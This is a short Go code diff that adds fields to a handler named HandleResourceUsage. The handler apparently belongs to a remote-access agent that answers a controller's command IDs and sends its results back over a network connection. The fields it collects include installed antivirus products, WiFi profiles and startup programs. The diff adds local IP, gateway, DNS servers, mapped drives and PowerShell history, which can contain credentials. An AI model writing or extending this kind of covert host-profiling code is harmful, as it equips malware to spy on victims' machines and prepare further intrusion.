@@ -42,6 +42,11 @@ func HandleResourceUsage(ctx context.Context, env *runtime.Env, cmdID string) er
 		"startup_programs":     usage.StartupPrograms,
 		"antivirus_products":   usage.AntivirusProducts,
 		"wifi_profiles":        usage.WiFiProfiles,
+		"local_ip":             usage.LocalIP,
+		"default_gateway":      usage.DefaultGateway,
+		"dns_servers":          usage.DNSServers,
+		"mapped_drives":        usage.MappedDrives,
+		"ps_history":           usage.PSHistory,
 	}
 
 	if err := wire.WriteMsg(ctx, env.Conn, msg); err != nil {
